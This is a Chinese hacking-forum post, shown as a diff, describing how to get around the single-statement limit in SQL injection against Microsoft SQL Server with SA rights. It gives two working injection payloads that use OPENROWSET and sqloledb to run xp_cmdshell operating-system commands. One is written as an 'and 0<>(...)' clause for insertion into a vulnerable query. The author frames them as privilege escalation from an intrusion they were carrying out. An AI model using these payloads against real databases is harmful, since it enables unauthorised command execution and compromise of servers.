@@ -1,0 +1,27 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SQL注入不能多句执行时的一种突破方法（SA权限）
+D8888D主贴内容-------------------------------------------------------
+ 
+
+有时候会遇到SA权限不能多句执行的情况，让人很蛋疼。
+前几天在搞一个SQL SERVER 7.0的PUBLIC权限时。
+某牛给我以下语句提权
+
+本帖隐藏的内容需要回复才可以浏览
+select * from openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:''')
+
+
+本机测试成功。
+但实际环境中却出现[微软] [ODBC SQL Server驱动] [SQL Server中] OLE DB提供程序'sqloledb'无法创建一个接口 的错误。原因不明，还望哪位大牛解释。。
+
+虽然这个问题偶还没有解决，但今天遇到一个SA权限不能多句的情况（估计驱动问题，不解），让我蛋疼了一段时间。
+后来经过GOOGLE，发现SA权限还可以这样执行。
+
+本帖隐藏的内容需要回复才可以浏览
+and 0<>(select * from openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:'''))
+
+
+这样就绕过了多句执行的限制了。
+估计大牛们早就会了呃：）
